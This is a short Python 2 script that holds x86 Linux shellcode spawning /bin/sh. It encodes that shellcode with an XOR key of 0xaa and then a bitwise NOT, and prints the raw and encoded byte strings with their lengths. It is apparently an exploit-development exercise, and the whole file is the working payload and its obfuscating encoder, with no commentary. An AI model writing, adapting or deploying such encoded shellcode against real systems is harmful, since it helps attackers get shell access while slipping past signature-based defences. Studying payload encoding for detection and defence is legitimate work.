#!/usr/bin/env python

shellcode = \
("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


new_shellcode =''
XOR_encoded_shellcode = ''
XOR_encoded_shellcode_2 =  ''
NOT_encoded_shellcode = ''

for op_code in bytearray(shellcode):
	
	encoded = op_code^0xaa
	
	new_shellcode += '\\x'
	new_shellcode += '%02x' % op_code

	XOR_encoded_shellcode += '0x'
	XOR_encoded_shellcode += '%02x,' %  encoded


	XOR_encoded_shellcode_2 += '%02x' % encoded

shellcode_2 = bytearray.fromhex(XOR_encoded_shellcode_2)

for op_code in bytearray(shellcode_2):


	encoded_2 = ~op_code

 	NOT_encoded_shellcode += '0x'
        NOT_encoded_shellcode += '%02x,' % (encoded_2 & 0xff)
	

print 'Length of original shellcode: %d \n' % len(bytearray(shellcode))
print str(new_shellcode)
print '\n'
print XOR_encoded_shellcode_2
print '\n'
print 'Length of XOR encoded shellcode: %d \n' % len(bytearray(XOR_encoded_shellcode)) 
print XOR_encoded_shellcode
print '\n'
print 'Length of NOT encoded shellcode: %d \n' % len(bytearray(NOT_encoded_shellcode)) 
print NOT_encoded_shellcode

